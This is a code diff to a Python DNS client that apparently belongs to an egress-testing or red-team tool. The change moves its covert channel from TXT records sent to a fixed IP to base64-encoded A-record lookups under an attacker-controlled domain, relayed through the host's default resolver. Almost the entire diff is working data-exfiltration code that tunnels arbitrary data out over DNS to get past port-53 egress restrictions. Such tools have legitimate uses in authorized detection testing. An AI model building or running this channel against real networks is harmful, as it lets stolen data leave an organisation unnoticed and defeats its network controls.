@@ -1,12 +1,13 @@
 '''
 
-This is a DNS client that transmits data within DNS TXT requests
+This is a DNS client that transmits data within A record requests
 Thanks to Raffi for his awesome blog posts on how this can be done
 http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/
 
 '''
 
 import base64
+import dns.resolver
 import socket
 import sys
 from common import helpers
@@ -16,8 +17,8 @@ from scapy.all import *
 class Client:
 
     def __init__(self, cli_object):
-        self.protocol = "dns"
-        self.length = 35
+        self.protocol = "dns_resolved"
+        self.length = 20
         self.remote_server = cli_object.ip
 
     def transmit(self, data_to_transmit):
@@ -25,15 +26,12 @@ class Client:
         byte_reader = 0
         packet_number = 1
 
-        # Determine if sending via IP or domain name
-        if helpers.validate_ip(self.remote_server):
-            final_destination = self.remote_server
-        else:
-            print "[*] Resolving IP of domain..."
-            final_destination = socket.gethostbyname(self.remote_server)
+        resolver_object = dns.resolver.get_default_resolver()
+        nameserver = resolver_object.nameservers[0]
 
         while (byte_reader < len(data_to_transmit) + self.length):
             encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
+            encoded_data = encoded_data.replace("=", ".---")
 
             # calcalate total packets
             if ((len(data_to_transmit) % self.length) == 0):
@@ -45,11 +43,11 @@ class Client:
 
             # Craft the packet with scapy
             try:
-                send(IP(dst=final_destination)/UDP()/DNS(
-                    id=15, opcode=0,
-                    qd=[DNSQR(qname="egress-assess.com", qtype="TXT")], aa=1, qr=0,
-                    an=[DNSRR(rrname=encoded_data, type="TXT", ttl=10)]),
-                    verbose=False)
+                request_packet = IP(dst=nameserver)/UDP()/DNS(
+                    rd=1, qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")])
+                send(request_packet, iface='eth0', verbose=False)
+            except socket.gaierror:
+                pass
             except KeyboardInterrupt:
                 print "[*] Shutting down..."
                 sys.exit()
